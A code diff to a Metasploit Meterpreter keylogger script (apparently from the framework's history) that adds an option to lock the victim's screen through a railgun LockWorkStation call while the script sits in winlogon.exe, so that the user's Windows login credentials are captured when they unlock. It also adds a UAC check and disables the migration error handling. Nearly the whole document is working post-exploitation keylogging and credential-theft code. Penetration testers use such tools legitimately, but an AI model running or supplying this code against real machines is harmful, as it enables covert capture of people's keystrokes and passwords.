@@ -7,7 +7,8 @@ session = client
 @@exec_opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false, "Help menu." ],
 	"-t"  => [ true,  "Time interval in seconds between recollection of keystrokes, default 30 seconds." ],
-	"-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0." ]
+	"-c"  => [ true,  "Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0." ],
+	"-l"  => [ false, "Lock screen when capturing Winlogon credentials."]
 )
 def usage
 	print_line("Keylogger Recorder Meterpreter Script")
@@ -38,14 +39,31 @@ keytime = 30
 
 #Type of capture
 captype = 0
-
+# Function for locking the screen -- Thanks for the idea and API call Mubix
+def lock_screen
+	print_status("Locking Screen...")
+	client.core.use("railgun")
+	lock_info = client.railgun.user32.LockWorkStation()
+	if lock_info["GetLastError"] == 0
+		print_status("Screen has been locked")
+	else
+		print_error("Screen lock Failed")
+	end
+end
 #Function to Migrate in to Explorer process to be able to interact with desktop
-def explrmigrate(session,captype)
-	begin
+def explrmigrate(session,captype,lock)
+	#begin
 		if captype.to_i == 0
 			process2mig = "explorer.exe"
 		elsif captype.to_i == 1
+			if is_uac_enabled?
+				print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
+				raise Rex::Script::Completed
+			end
 			process2mig = "winlogon.exe"
+			if lock
+				lock_screen
+			end
 		else
 			process2mig = "explorer.exe"
 		end
@@ -59,10 +77,10 @@ def explrmigrate(session,captype)
 			end
 		end
 		return true
-	rescue
-		print_status("Failed to migrate process!")
-		return false
-	end
+#	rescue
+#		print_status("Failed to migrate process!")
+#		return false
+#	end
 end
 
 #Function for starting the keylogger
@@ -79,7 +97,7 @@ def startkeylogger(session)
 	end
 end
 
-#Funtion for Collecting Capture
+# Function for Collecting Capture
 def keycap(session, keytime, logfile)
 	begin
 		rec = 1
@@ -119,7 +137,6 @@ def keycap(session, keytime, logfile)
 			file_local_write(logfile,"#{outp}\n")
 			sleep(keytime.to_i)
 		end
-		db.close
 	rescue::Exception => e
 		print("\n")
 		print_status("#{e.class} #{e}")
@@ -129,7 +146,9 @@ def keycap(session, keytime, logfile)
 end
 
 # Parsing of Options
+
 helpcall = 0
+lock = false
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-t"
@@ -138,9 +157,11 @@ helpcall = 0
 		captype = val
 	when "-h"
 		usage
+	when "-l"
+		lock = true
 	end
 }
-if explrmigrate(session,captype)
+if explrmigrate(session,captype,lock)
 	if startkeylogger(session)
 		keycap(session, keytime, logfile)
 	end
